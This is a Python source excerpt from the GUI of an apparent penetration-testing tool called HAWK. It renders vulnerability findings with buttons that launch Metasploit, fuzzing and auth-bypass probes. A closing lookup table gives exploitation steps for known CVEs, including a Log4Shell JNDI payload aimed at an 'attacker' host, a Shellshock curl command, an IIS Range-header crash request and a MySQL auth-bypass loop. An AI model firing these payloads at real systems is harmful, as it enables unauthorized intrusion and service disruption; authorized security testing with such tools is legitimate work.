            f"({len(self._auto_findings)} found)",
            COLORS["text_red"], summary)

        if collapsed:
            return start_row

        # Sort critical → info; stable sort keeps discovery order inside
        # each severity bucket. Group visually with a mini subheader so
        # the user can skim the sections.
        sorted_findings = sorted(
            self._auto_findings,
            key=lambda f: sev_rank.get(
                (f.get("severity") or "info").lower(), 4))

        current_sev = None
        for _fi, finding in enumerate(sorted_findings):
            # Progressive paint: building each finding is ~a dozen
            # customtkinter widgets, so a large findings set is a
            # multi-second layout.  Flush the idle queue every few cards
            # so they appear in batches instead of the whole panel
            # freezing blank until the last one is built.  (update_idletasks
            # only drains pending redraws — it does not re-enter event
            # handling, so it can't recurse into another render.)
            if _fi and _fi % 8 == 0:
                try:
                    self.update_idletasks()
                except Exception:
                    pass

            sev = (finding.get("severity") or "info").lower()
            sev_color = sev_colors.get(sev, COLORS["text_dim"])

            # Severity group heading (only when it changes).
            if sev != current_sev:
                current_sev = sev
                grp = ctk.CTkFrame(body, fg_color="transparent")
                grp.pack(fill="x", padx=6, pady=(8, 2))
                ctk.CTkLabel(
                    grp,
                    text=f"──  {sev.upper()}  ({counts.get(sev,0)})",
                    font=_f("sm", True), text_color=sev_color,
                    anchor="w").pack(side="left")

            # Fresh-highlight: stays on until the user actually clicks
            # the finding (no time-based decay).  Visible treatment:
            #   • bright green border 3 px (instead of cyan 2 px)
            #   • slightly lighter card background
            #   • bright "◆ NEW" / "◆ UPDATED" badge on the top-right
            is_fresh = bool(finding.get("_fresh"))
            note     = finding.get("_update_note", "") if is_fresh else ""

            if is_fresh:
                fr = ctk.CTkFrame(body,
                                  fg_color=COLORS["bg_card_hover"],
                                  border_color=COLORS["text_green"],
                                  border_width=3,
                                  corner_radius=4)
            else:
                fr = ctk.CTkFrame(body, fg_color=COLORS["bg_card"],
                                  corner_radius=3)
            fr.pack(fill="x", padx=8, pady=3)
            # Stash a reference to the outer card frame on the finding —
            # _mark_finding_read uses this to repaint the border in-place
            # instead of rebuilding the whole auto_findings section.  This
            # is what kills the "disappear for 2 seconds" flash the user
            # reported: we update the ONE widget that changed, not the 50+
            # sibling widgets that didn't.
            finding["_frame_ref"] = fr

            top = ctk.CTkFrame(fr, fg_color="transparent")
            top.pack(fill="x", padx=8, pady=(5, 2))

            # Right-anchored fresh badge — packed FIRST so pack reserves its
            # full width on the right before the title/source chain fills the
            # rest.  Packed last (as it used to be) it was the BADGE that got
            # clipped when the row was crowded, turning "◆ REFRESHED #4" into
            # gibberish ("… 4 :SHED #4").  Now an over-long title truncates at
            # the badge edge instead; the full title stays in the card body and
            # the INFO dialog, whereas the fresh badge must always stay legible.
            if note:
                # Bright-green badge — "◆ NEW" / "◆ UPDATED" / "◆ REFRESHED #N".
                # Stays on until the user actually reads the entry.
                badge_lbl = ctk.CTkLabel(
                    top, text=f"◆ {note}",
                    font=_f("md", True),
                    text_color=COLORS["text_green"],
                    anchor="e")
                badge_lbl.pack(side="right", padx=6)
                finding["_badge_ref"] = badge_lbl
            else:
                finding["_badge_ref"] = None

            ctk.CTkLabel(top, text=f"[{finding['severity'].upper()}]",
                         font=_f("sm", True), text_color=sev_color,
                         width=80, anchor="w").pack(side="left")
            ctk.CTkLabel(top, text=finding["title"],
                         font=_f("md", True), text_color=COLORS["text_bright"],
                         anchor="w").pack(side="left", padx=6)
            if finding.get("source"):
                ctk.CTkLabel(top, text=f"  via {finding['source']}",
                             font=_f("sm"), text_color=COLORS["text_muted"],
                             anchor="w").pack(side="left")
            # Run counter — suppressed while a fresh badge is shown, since the
            # note already carries the run number ("◆ REFRESHED #4"); a bare
            # "4" beside "#4" duplicated it and stole width from the badge.
            runs_text = self._format_finding_runs(finding)
            if runs_text and not note:
                ctk.CTkLabel(top, text=f"  {runs_text}",
                             font=_f("xs", True),
                             text_color=COLORS["text_cyan"],
                             anchor="w").pack(side="left", padx=(4, 0))

            # Description — rendered as a CTkLabel (NOT a CTkTextbox) so
            # the mouse wheel event propagates to the outer Target Intel
            # scrollable frame instead of being trapped by an internal
            # text-widget scrollbar.  User request: "la rotellina deve
            # scorrere tutti gli intel, le info di ciascun intel non
            # devono essere scrollabili — se serve il testo completo si
            # clicca INFO".
            #
            # We truncate anything longer than MAX_CHARS and append "…"
            # so long descriptions don't blow up the card height.  The
            # INFO button (below) shows the full text in a dialog.
            desc_text = finding['description']
            MAX_CHARS = 240
            if len(desc_text) > MAX_CHARS:
                # Cut at a word boundary close to MAX_CHARS for a cleaner look.
                cut = desc_text.rfind(" ", 0, MAX_CHARS)
                if cut < MAX_CHARS // 2:
                    cut = MAX_CHARS
                desc_display = desc_text[:cut].rstrip() + " …"
                truncated = True
            else:
                desc_display = desc_text
                truncated = False

            # Selectable so the operator can copy IPs/paths/hashes
            # straight off the row without opening the INFO dialog.
            desc_lbl = self._selectable_label(
                fr, desc_display,
                font=_f("sm"), text_color=COLORS["text_dim"],
                wraplength=640,
                pad=(12, (0, 2)))

            if truncated:
                # Muted hint so the user knows there's more behind INFO
                # without the visual noise of a second full-weight line.
                ctk.CTkLabel(
                    fr, text="  …  click INFO for the full description",
                    font=_f("xs"),
                    text_color=COLORS["text_muted"],
                    anchor="w"
                ).pack(fill="x", padx=12, pady=(0, 2))

            # Collect ALL MSF modules that could exploit this finding.
            # Usually 1, sometimes more (ms17-010 has exploit+psexec+scanner,
            # log4shell has exploit+scanner, etc.).  The button label
            # adapts — shows a chevron hint when a picker will open.
            #
            # Some sources carry their own actionable payload, or an
            # MSF module makes no sense for them at all — see
            # _MSF_SKIP_SOURCES at the top of this module for the
            # per-entry rationale.
            if _msf_suggestions_suppressed(finding.get("source")):
                exploit_modules = []
            else:
                exploit_modules = self._rank_modules_for_target(
                    _get_exploits_for_vuln(
                        finding["title"], finding["description"]),
                    finding)
            exploit_module = exploit_modules[0][0] if exploit_modules else ""
            btn_row = ctk.CTkFrame(fr, fg_color="transparent")
            btn_row.pack(fill="x", padx=8, pady=(0, 6))

            def _info_handler(f=finding):
                try:
                    self._show_finding_info(f)
                    # Clicking INFO counts as "read" after the dialog
                    # opens successfully.
                    self._mark_finding_read(f)
                except Exception as exc:
                    try:
                        self.app.terminal.write(
                            f"  [!] Target Intel INFO failed: {exc}",
                            "error")
                    except Exception:
                        pass

            ctk.CTkButton(
                btn_row, text="ℹ INFO",
                width=80, height=24,
                font=_f("sm", True),
                fg_color=COLORS["bg_secondary"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_dim"], border_width=1,
                text_color=COLORS["text_dim"], corner_radius=3,
                command=_info_handler,
            ).pack(side="left", padx=(0, 4))

            # 🔑 CREDS button — only when this finding was produced
            # by an AD tool parser that ALSO pushed one or more
            # credentials in the same run.  We count how many
            # credentials carry the matching linked_run_id so the
            # button can label e.g. "🔑 3 creds" and give the user
            # a hint of what the jump will show.
            finding_rid = finding.get("linked_run_id") or ""
            if finding_rid:
                try:
                    sess = self.app.session_manager.current
                    creds = sess.get_credentials() if sess else []
                    n_linked = sum(
                        1 for c in creds
                        if getattr(c, "linked_run_id", "") == finding_rid)
                except Exception:
                    n_linked = 0
                if n_linked > 0:
                    ctk.CTkButton(
                        btn_row,
                        text=f"🔑 {n_linked} CRED"
                             f"{'S' if n_linked != 1 else ''}",
                        width=100, height=24,
                        font=_f("sm", True),
                        fg_color="transparent",
                        hover_color=COLORS["bg_card_hover"],
                        border_color=COLORS["text_cyan"],
                        border_width=1,
                        text_color=COLORS["text_cyan"],
                        corner_radius=3,
                        command=lambda r=finding_rid:
                            self.app.navigate_to_run_id(r, "creds"),
                    ).pack(side="left", padx=(0, 4))

            if is_fresh:
                # A quick "mark-as-read" option that doesn't open the
                # info dialog — for users who just want to dismiss the
                # highlight on lots of findings at once.  We keep a
                # ref on the finding so _mark_finding_read can destroy
                # the button in place (no full-section rerender).
                mark_btn = ctk.CTkButton(
                    btn_row, text="✓  MARK READ",
                    width=120, height=24,
                    font=_f("sm", True),
                    fg_color=COLORS["bg_secondary"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["border_green"], border_width=1,
                    text_color=COLORS["text_green"], corner_radius=3,
                    command=lambda f=finding: self._mark_finding_read(f),
                )
                mark_btn.pack(side="left", padx=(0, 4))
                finding["_mark_btn_ref"] = mark_btn
            else:
                finding["_mark_btn_ref"] = None

            # ── FUZZ DIR button (Gap A) ─────────────────────────
            # When the finding carries a path with ≥ 2 segments and
            # neither the file nor the parent dir is static, surface
            # a "▶ FUZZ <parent>/" button that opens gobuster pre-
            # configured on the parent. Keeps the operator in flow:
            # they don't need to recognise that /api/ is fuzzable —
            # HAWK does.
            try:
                fuzz_info = self._extract_fuzzable_path(finding)
            except Exception:
                fuzz_info = None
            if fuzz_info:
                fz_label = f"▶ FUZZ {fuzz_info['parent_label']}"
                # Cap label length so the button doesn't shove other
                # actions off-screen on long paths.
                if len(fz_label) > 28:
                    fz_label = fz_label[:25] + "…"

                def _fuzz_handler(fi=fuzz_info, fnd=finding):
                    self._mark_finding_read(fnd)
                    self._launch_fuzz_dir(fi)

                ctk.CTkButton(
                    btn_row, text=fz_label,
                    width=max(110, len(fz_label) * 8),
                    height=24, font=_f("sm", True),
                    fg_color="transparent",
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS.get("text_cyan", "#7EC8E3"),
                    border_width=1,
                    text_color=COLORS.get("text_cyan", "#7EC8E3"),
                    corner_radius=3,
                    command=_fuzz_handler,
                ).pack(side="left", padx=(0, 4))

            # ── Generic ADD HOSTS button ───────────────────────────
            # Any finding whose description carries discovered FQDNs
            # under the session's target_domain gets a button to map
            # them in /etc/hosts.  Click opens a checkbox-picker so
            # the operator chooses which to add (default: all).  Hosts
            # already tracked in session.hawk_hosts_entries don't show
            # up — when the user re-runs ffuf vhost the button auto-
            # hides for entries already mapped.
            try:
                discovered_hosts = self._extract_discovered_hostnames(finding)
            except Exception:
                discovered_hosts = []
            if discovered_hosts:
                ah_label = (f"▶ ADD {len(discovered_hosts)} HOST"
                            f"{'S' if len(discovered_hosts) != 1 else ''} "
                            f"TO /etc/hosts")
                if len(ah_label) > 34:
                    ah_label = f"▶ ADD {len(discovered_hosts)} → /etc/hosts"

                def _addhosts_picker_handler(fnd=finding,
                                              hosts=discovered_hosts):
                    self._show_hosts_picker(hosts, fnd)

                ctk.CTkButton(
                    btn_row, text=ah_label,
                    width=max(180, len(ah_label) * 8),
                    height=24, font=_f("sm", True),
                    fg_color="transparent",
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS.get("text_cyan", "#7EC8E3"),
                    border_width=1,
                    text_color=COLORS.get("text_cyan", "#7EC8E3"),
                    corner_radius=3,
                    command=_addhosts_picker_handler,
                ).pack(side="left", padx=(0, 4))

            # ── AI-OPS findings: RUN AUTH BYPASS PROBES + SEARCH CVE
            # AI-OPS playbook entries carry a list of curl probes the
            # operator can run to confirm whether the documented
            # auth-bypass / version-leak holds on this specific
            # target.  The PROBES button fires them all in a worker
            # thread, writes a one-line summary per probe to the
            # terminal, and pushes a CRITICAL secondary finding when
            # any probe returns the "expected" success status.
            #
            # The SEARCH CVE button delegates to the existing CVE
            # picker (target_intel_admin._show_search_picker) with
            # mode 3 ("Custom keywords on web") pre-selected and the
            # keyword pre-filled with `<tool> <version>` — version
            # captured from `_aiops_detected_version` if PROBES has
            # already run, otherwise just the tool name.  CVE
            # coverage is intentionally OUTSOURCED to live web search
            # (Google + GitHub Advisories + ExploitDB + Packet
            # Storm); see the docstring at the top of
            # utils/aiops_playbooks for the rationale.
            from utils import aiops_playbooks as _ap_mod
            if _ap_mod.is_aiops_source(finding.get("source") or ""):
                # Resolve registry entry from source tag.
                _src = finding.get("source") or ""
                _m_id = re.search(r"\(([^)]+)\)", _src)
                _entry_id = _m_id.group(1) if _m_id else ""
                _entry = next(
                    (e for e in _ap_mod.AIOPS_REGISTRY
                     if e["id"] == _entry_id), None)

                def _aiops_run_handler(fnd=finding):
                    self._aiops_run_bypass_probes(fnd)
                ctk.CTkButton(
                    btn_row, text="🤖 RUN AUTH BYPASS PROBES",
                    width=240, height=24, font=_f("sm", True),
                    fg_color="transparent",
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS.get("text_red", "#FF5555"),
                    border_width=1,
                    text_color=COLORS.get("text_red", "#FF5555"),
                    corner_radius=3,
                    command=_aiops_run_handler,
                ).pack(side="left", padx=(0, 4))

                if _entry is not None:
                    def _aiops_search_cve(fnd=finding, ent=_entry):
                        self._aiops_open_cve_search(fnd, ent)
                    ctk.CTkButton(
                        btn_row, text="🔍 SEARCH CVE",
                        width=160, height=24, font=_f("sm", True),
                        fg_color="transparent",
                        hover_color=COLORS["bg_card_hover"],
                        border_color=COLORS.get("text_yellow",
                                                "#FFCC00"),
                        border_width=1,
                        text_color=COLORS.get("text_yellow", "#FFCC00"),
                        corner_radius=3,
                        command=_aiops_search_cve,
                    ).pack(side="left", padx=(0, 4))

            # ── Vhost-discovery findings: ATTACK button ────────────
            # When a ffuf-vhost or gobuster-dns finding lands with
            # actual hits, surface a button that opens Oracle on
            # the picked subdomain.  Closes the loop:
            # wildcard cert → FUZZ VHOSTS → discovered → ATTACK.
            disc_src = (finding.get("source") or "").lower()
            if disc_src in ("ffuf-vhost", "gobuster-dns"):
                attack_hosts = self._extract_attackable_vhosts(finding)
                if attack_hosts:
                    def _attack_handler(fnd=finding, hosts=attack_hosts):
                        self._show_attack_picker(hosts, fnd)
                    ctk.CTkButton(
                        btn_row, text="▶ ATTACK NEW VHOSTS",
                        width=180, height=24, font=_f("sm", True),
                        fg_color="transparent",
                        hover_color=COLORS["bg_card_hover"],
                        border_color=COLORS.get("text_yellow", "#FFCC00"),
                        border_width=1,
                        text_color=COLORS.get("text_yellow", "#FFCC00"),
                        corner_radius=3,
                        command=_attack_handler,
                    ).pack(side="left", padx=(0, 4))

            # ── Cert advisory: wildcard → FUZZ VHOSTS ──────────────
            # The cert-advisory-san variant doesn't need its own
            # button anymore — the generic ADD HOSTS detector above
            # already picks up the hostname list from the finding's
            # description and surfaces the picker.
            advisory_src = (finding.get("source") or "").lower()
            if "cert-advisory-wildcard" in advisory_src:
                def _vhosts_handler(fnd=finding):
                    self._mark_finding_read(fnd)
                    self._launch_vhost_fuzz(fnd)
                ctk.CTkButton(
                    btn_row, text="▶ FUZZ VHOSTS",
                    width=140, height=24, font=_f("sm", True),
                    fg_color="transparent",
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS.get("text_cyan", "#7EC8E3"),
                    border_width=1,
                    text_color=COLORS.get("text_cyan", "#7EC8E3"),
                    corner_radius=3,
                    command=_vhosts_handler,
                ).pack(side="left", padx=(0, 4))

            if exploit_module:
                n_modules = len(exploit_modules)
                btn_text = ("▶ EXPLOIT WITH MSF ▾"
                            if n_modules > 1
                            else "▶ EXPLOIT WITH MSF")
                btn_width = 190 if n_modules > 1 else 160

                def _msf_launch(mods=exploit_modules, fi=finding):
                    self._mark_finding_read(fi)
                    if len(mods) <= 1:
                        self._show_msf_launch_dialog(mods[0][0], fi)
                    else:
                        self._show_msf_module_picker(mods, fi)

                ctk.CTkButton(
                    btn_row, text=btn_text,
                    width=btn_width, height=24,
                    font=_f("sm", True),
                    fg_color=COLORS["bg_secondary"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["border_green"], border_width=1,
                    text_color=COLORS["text_green"], corner_radius=3,
                    command=_msf_launch,
                ).pack(side="left")

            if finding.get("source") == "searchsploit":
                edb_path = self._extract_edb_path(finding)
                if edb_path:
                    def _copy_exploit(p=edb_path):
                        self._run_searchsploit_action("copy", p)
                    def _view_exploit(p=edb_path):
                        self._run_searchsploit_action("view", p)
                    ctk.CTkButton(
                        btn_row, text="📋 COPY",
                        width=80, height=24,
                        font=_f("sm", True),
                        fg_color=COLORS["bg_secondary"],
                        hover_color=COLORS["bg_card_hover"],
                        border_color=COLORS.get("text_cyan", "#7EC8E3"),
                        border_width=1,
                        text_color=COLORS.get("text_cyan", "#7EC8E3"),
                        corner_radius=3,
                        command=_copy_exploit,
                    ).pack(side="left", padx=(4, 0))
                    ctk.CTkButton(
                        btn_row, text="👁 VIEW",
                        width=80, height=24,
                        font=_f("sm", True),
                        fg_color=COLORS["bg_secondary"],
                        hover_color=COLORS["bg_card_hover"],
                        border_color=COLORS["border_dim"],
                        border_width=1,
                        text_color=COLORS["text_dim"],
                        corner_radius=3,
                        command=_view_exploit,
                    ).pack(side="left", padx=(4, 0))

            # Any click on the finding card (or its children) also marks
            # it read — covers the case where the user reads the text
            # box content without pressing a button.
            if is_fresh:
                def _bind_click(w, f=finding):
                    try:
                        # `e=None` makes the callback safe even when
                        # something invokes it without a Tk event arg
                        # (CTkScrollableFrame's wheel/click chain has
                        # been seen calling propagated handlers with
                        # no event in some customtkinter versions).
                        w.bind("<Button-1>",
                               lambda e=None, fi=f:
                                   self._mark_finding_read(fi))
                        for child in w.winfo_children():
                            # Skip CTkButton (they have their own
                            # command and propagate clicks oddly).
                            if not isinstance(child, ctk.CTkButton):
                                _bind_click(child, f)
                    except Exception:
                        pass
                _bind_click(fr)

        ctk.CTkLabel(af, text="", font=_f("sm")).pack(pady=2)
        return start_row

    def _render_auto_findings(self):
        """Incremental refresh of just the auto-findings section.  Used
        after add_auto_finding / mark-as-read.  Avoids the full-rebuild
        flash (fingerprint + ports + exploits stay on screen)."""
        # If the auto_findings section didn't exist yet (e.g. this is the
        # first finding we're adding), topology changes → full rebuild.
        if "auto_findings" not in getattr(self, "_section_rows", {}):
            self._render_all()
        else:
            self._rerender_section("auto_findings")

    @staticmethod
    def _extract_edb_path(finding: dict) -> str:
        desc = finding.get("description", "")
        m = re.search(r"EDB path:\s*(\S+)", desc)
        return m.group(1) if m else ""

    def _run_searchsploit_action(self, action: str, edb_path: str):
        import subprocess
        import threading

        def _worker():
            try:
                from utils.runner import _hawk_env
                if action == "copy":
                    # `searchsploit -m` copies into the process working
                    # directory, so run it FROM the HAWK exploits folder
                    # instead of wherever the operator launched HAWK.
                    import os as _os
                    from utils.config import OUTPUTS_DIR
                    dest_dir = _os.path.join(OUTPUTS_DIR, "exploits")
                    _os.makedirs(dest_dir, exist_ok=True)
                    r = subprocess.run(
                        ["searchsploit", "-m", edb_path],
                        capture_output=True, text=True, timeout=15,
                        cwd=dest_dir, env=_hawk_env())
                    self.app.terminal.write(
                        f"  $ searchsploit -m {edb_path}", "cmd")
                    for line in (r.stdout or "").splitlines():
                        if line.strip():
                            self.app.terminal.write(
                                f"  {line}", "success")
                    if r.returncode == 0:
                        self.app.terminal.write(
                            f"  [+] Exploit copied to {dest_dir}",
                            "success")
                elif action == "view":
                    r = subprocess.run(
                        ["searchsploit", "-x", edb_path],
                        capture_output=True, text=True, timeout=15,
                        env=_hawk_env())
                    self.app.terminal.write(
                        f"  $ searchsploit -x {edb_path}", "cmd")
                    source = (r.stdout or "").strip()
                    if source:
                        self.app.after(
                            0, lambda s=source, p=edb_path:
                            self._show_exploit_source(s, p))
                    else:
                        self.app.terminal.write(
                            f"  [!] No source returned", "warn")
            except Exception as e:
                self.app.terminal.write(
                    f"  [!] searchsploit error: {e}", "error")

        threading.Thread(target=_worker, daemon=True).start()

    def _show_exploit_source(self, source: str, path: str):
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn

        win = _make_win(self, f"Exploit Source — {path}", 800, 600)
        ctk.CTkLabel(
            win, text=f"📄  {path}",
            font=ctk.CTkFont(family="Courier New", size=14, weight="bold"),
            text_color=COLORS.get("text_cyan", "#7EC8E3"),
            anchor="w",
        ).pack(fill="x", padx=14, pady=(10, 4))

        txt = ctk.CTkTextbox(
            win, font=ctk.CTkFont(family="Courier New", size=12),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_bright"],
            border_width=0, corner_radius=3, wrap="none")
        txt.pack(fill="both", expand=True, padx=14, pady=(0, 6))
        txt.insert("1.0", source)
        txt.configure(state="disabled")

        row = _btn_row(win)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=120)

    def _show_finding_info(self, finding: dict):
        """Show info dialog for a finding — what it is, what you get, how to exploit."""
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn

        title       = finding.get("title", "")
        description = finding.get("description", "")

        # Look up info DB
        FINDING_INFO = {
            "ms17-010":     {"what":"Buffer overflow in Windows SMBv1 (port 445).","get":"SYSTEM shell — full control.","how":"Metasploit: exploit/windows/smb/ms17_010_eternalblue\nManual: searchsploit ms17-010","tools":["MSF","searchsploit"],"cve":"CVE-2017-0144","affects":"Windows XP → Server 2008 R2 (unpatched)"},
            "ms08-067":     {"what":"Buffer overflow in Windows Server Service.","get":"SYSTEM shell.","how":"Metasploit: exploit/windows/smb/ms08_067_netapi","tools":["MSF"],"cve":"CVE-2008-4250","affects":"Windows 2000/XP/2003/Vista/2008"},
            "heartbleed":   {"what":"Memory disclosure in OpenSSL TLS heartbeat.","get":"Server memory — may include passwords and private keys.","how":"Metasploit: auxiliary/scanner/ssl/openssl_heartbleed","tools":["MSF","testssl.sh"],"cve":"CVE-2014-0160","affects":"OpenSSL 1.0.1 → 1.0.1f"},
            "bluekeep":     {"what":"Use-after-free in Windows RDP — no auth needed.","get":"SYSTEM shell via RDP.","how":"Metasploit: exploit/windows/rdp/cve_2019_0708_bluekeep_rce","tools":["MSF"],"cve":"CVE-2019-0708","affects":"Windows XP/7/Server 2008"},
            "smb anonymous":{"what":"SMB accessible without credentials.","get":"Read/write access to shares — may contain sensitive files.","how":"smbclient //target/SHARE -N\nnxc smb target --shares","tools":["smbclient","nxc"],"cve":"N/A","affects":"Misconfigured Windows/Samba"},
            "snmp":         {"what":"SNMP with default community string (public/private).","get":"System info, processes, network interfaces, installed software.","how":"snmpwalk -v2c -c public target\nsnmp-check target -c public","tools":["snmpwalk","snmp-check","onesixtyone"],"cve":"N/A","affects":"Any device with SNMP enabled"},
            "winrm":        {"what":"Windows Remote Management service open.","get":"Remote shell if credentials available.","how":"evil-winrm -i target -u administrator -p password","tools":["evil-winrm","nxc winrm"],"cve":"N/A","affects":"Windows with WinRM enabled"},
            "cve-2014-3566":{"what":"SSLv3 POODLE — Padding Oracle on Downgraded Legacy Encryption.\nAn attacker can force a TLS downgrade to SSLv3, then exploit the CBC padding oracle to decrypt HTTPS traffic byte-by-byte.","get":"Decryption of session cookies, auth tokens, sensitive data in transit.","how":"testssl.sh --poodle target:port\nnmap --script ssl-poodle -p 443 target\nDisable SSLv3 on the server to fix.","tools":["testssl.sh","nmap","sslyze"],"cve":"CVE-2014-3566","affects":"Any server/service with SSLv3 enabled (HTTPS, LDAPS, IMAPS, SMTPS, etc.)"},
            "poodle":       {"what":"SSLv3 POODLE — Padding Oracle on Downgraded Legacy Encryption.\nAn attacker can force a TLS downgrade to SSLv3, then exploit the CBC padding oracle to decrypt HTTPS traffic byte-by-byte.","get":"Decryption of session cookies, auth tokens, sensitive data in transit.","how":"testssl.sh --poodle target:port\nnmap --script ssl-poodle -p 443 target\nDisable SSLv3 on the server to fix.","tools":["testssl.sh","nmap","sslyze"],"cve":"CVE-2014-3566","affects":"Any server/service with SSLv3 enabled (HTTPS, LDAPS, IMAPS, SMTPS, etc.)"},
            "ssl-poodle":   {"what":"SSLv3 POODLE — Padding Oracle on Downgraded Legacy Encryption.\nAn attacker can force a TLS downgrade to SSLv3, then exploit the CBC padding oracle to decrypt HTTPS traffic byte-by-byte.","get":"Decryption of session cookies, auth tokens, sensitive data in transit.","how":"testssl.sh --poodle target:port\nnmap --script ssl-poodle -p 443 target\nDisable SSLv3 on the server to fix.","tools":["testssl.sh","nmap","sslyze"],"cve":"CVE-2014-3566","affects":"Any server/service with SSLv3 enabled (HTTPS, LDAPS, IMAPS, SMTPS, etc.)"},
            "cve-2014-3704":{"what":"Drupalgeddon — Pre-Auth SQL Injection in Drupal 7.x.\nAn unauthenticated attacker can inject SQL through the login form, creating admin accounts or executing arbitrary PHP.","get":"Admin access → full RCE via PHP eval / module upload.","how":"Metasploit: exploit/multi/http/drupal_drupageddon\nsearchsploit drupal 7 sql\ncurl-based PoC: add admin user via SQL injection","tools":["MSF","searchsploit","curl"],"cve":"CVE-2014-3704","affects":"Drupal 7.x before 7.32"},
            "drupalgeddon": {"what":"Drupalgeddon — Pre-Auth SQL Injection in Drupal 7.x.\nAn unauthenticated attacker can inject SQL through the login form, creating admin accounts or executing arbitrary PHP.","get":"Admin access → full RCE via PHP eval / module upload.","how":"Metasploit: exploit/multi/http/drupal_drupageddon\nsearchsploit drupal 7 sql\ncurl-based PoC: add admin user via SQL injection","tools":["MSF","searchsploit","curl"],"cve":"CVE-2014-3704","affects":"Drupal 7.x before 7.32"},
            "log4shell":    {"what":"Log4j JNDI injection — RCE via crafted log messages.\nAny input field that gets logged can trigger arbitrary JNDI/LDAP lookups and load remote classes.","get":"Remote Code Execution as the Java process user.","how":"Metasploit: exploit/multi/http/log4shell_header_injection\n${jndi:ldap://attacker/exploit}\nnuclei -t cves/2021/CVE-2021-44228.yaml","tools":["MSF","nuclei","curl"],"cve":"CVE-2021-44228","affects":"Apache Log4j 2.x < 2.15.0"},
            "ms15-034":     {"what":"HTTP.sys Integer Overflow — Remote code execution via crafted Range header.\nSending a malformed Range header to IIS causes an integer overflow in HTTP.sys kernel driver.","get":"BSOD (DoS) or kernel-level RCE.","how":"Metasploit: auxiliary/dos/http/ms15_034_ulonglongadd\ncurl -H 'Range: bytes=0-18446744073709551615' http://target/ -I","tools":["MSF","curl"],"cve":"CVE-2015-1635","affects":"Windows 7/8/Server 2008 R2/2012 with IIS"},
            "shellshock":   {"what":"Bash CGI RCE — environment variable injection via HTTP headers.\nCGI scripts using Bash inherit attacker-controlled HTTP headers as environment variables.","get":"Remote command execution as web server user.","how":"Metasploit: exploit/multi/http/apache_mod_cgi_bash_env_exec\ncurl -A '() { :;}; /bin/id' http://target/cgi-bin/script","tools":["MSF","curl","nmap"],"cve":"CVE-2014-6271","affects":"Bash < 4.3 with CGI scripts"},

            # ── SMTP / Mail ─────────────────────────────────────────────
            "cve-2010-4344": {
                "what":"Postfix Exim 'memory corruption in DKIM' — buffer overflow in the SMTP daemon when handling oversized strings during the SMTP transaction.\nAffects Exim 4.x < 4.69 (NOT Postfix despite the script name confusion).",
                "get":"Remote shell as the mail process (Exim runs as 'mail' user, sometimes root). Pre-auth, no creds required.",
                "how":"Metasploit: exploit/unix/smtp/exim4_string_format\nsearchsploit exim 4.69\nManual PoC: send oversized 'mail from:' string with format-string payload.",
                "tools":["MSF","searchsploit"],
                "cve":"CVE-2010-4344",
                "affects":"Exim 4.x before 4.69 (Debian, Ubuntu old releases, Metasploitable2)",
            },
            "cve2010-4344":     "__alias__cve-2010-4344",
            "smtp-vuln-cve2010-4344":"__alias__cve-2010-4344",
            "exim_string_format":"__alias__cve-2010-4344",

            "cve-2010-4345": {
                "what":"Exim 4.x privilege escalation via mail spool — local user can become root by exploiting the way Exim processes its own config when invoked with -be.",
                "get":"Local privilege escalation from any unprivileged user → root.",
                "how":"Metasploit: exploit/unix/local/exim4_string_format\nLocal: needs an existing shell as 'mail' or unprivileged user (typically obtained via CVE-2010-4344 first).",
                "tools":["MSF","searchsploit","local PoC"],
                "cve":"CVE-2010-4345",
                "affects":"Exim 4.x before 4.73 — local privesc primitive",
            },
            "smtp-vuln-cve2010-4345":"__alias__cve-2010-4345",

            # ── MySQL ─────────────────────────────────────────────────────
            "cve-2012-2122": {
                "what":"MySQL/MariaDB auth bypass via memcmp() return-value abuse.\nWith bad luck (~1/256 attempts) the password comparison returns truthy with ANY password — letting any user log in by retrying.",
                "get":"Authenticated MySQL access as the user being brute-forced (typically root) without knowing the password.",
                "how":"Metasploit: auxiliary/scanner/mysql/mysql_authbypass_hashdump\nManual: for i in $(seq 1 1000); do mysql -h <target> -u root -p'wrong' -e 'show databases'; done",
                "tools":["MSF","mysql client","python loop"],
                "cve":"CVE-2012-2122",
                "affects":"MariaDB/MySQL 5.1.x < 5.1.62, 5.2.x < 5.2.12, 5.3.x < 5.3.6, 5.5.x < 5.5.23 — only specific glibc/compile combos",
            },
            "mysql-vuln-cve2012-2122":"__alias__cve-2012-2122",

            # ── SSL/TLS extras (DROWN / CCS / FREAK / Logjam) ────────────
            "cve-2016-0800": {
                "what":"DROWN — cross-protocol attack abusing SSLv2 export ciphers to decrypt modern TLS traffic.\nA server still speaking SSLv2 lets attackers decrypt RSA-key-based TLS sessions on ANY service sharing the same private key.",
                "get":"Decryption of TLS traffic protected with the shared RSA key (HTTPS, IMAPS, etc.).",
                "how":"testssl.sh --drown target:port\nnmap --script sslv2-drown -p 443 target\nnmap --script ssl-enum-ciphers (look for SSLv2 entries).",
                "tools":["testssl.sh","nmap","sslyze"],
                "cve":"CVE-2016-0800",
                "affects":"Any server with SSLv2 enabled OR sharing an RSA key with a server that does",
            },
            "sslv2-drown":     "__alias__cve-2016-0800",
            "ssl-drown":       "__alias__cve-2016-0800",

            "cve-2014-0224": {
                "what":"OpenSSL CCS Injection — early ChangeCipherSpec acceptance lets a MitM force the use of weak keying material, downgrading the session.",
                "get":"MitM decryption / modification of TLS sessions when both client AND server are vulnerable.",
                "how":"testssl.sh -y target:port\nnmap --script ssl-ccs-injection -p 443 target\nFix: upgrade OpenSSL to 1.0.1h+ / 1.0.0m+ / 0.9.8za+.",
                "tools":["testssl.sh","nmap","sslyze"],
                "cve":"CVE-2014-0224",
                "affects":"OpenSSL < 1.0.1h client AND server",
            },
            "ssl-ccs-injection":"__alias__cve-2014-0224",

            "cve-2015-4000": {
                "what":"Logjam — TLS Diffie-Hellman key-exchange downgrade to weak 512-bit export-grade DH groups.\nAn active MitM forces the export DH group, which is precomputable, allowing session decryption.",
                "get":"Decryption / MitM of TLS sessions that negotiate DHE_EXPORT.",
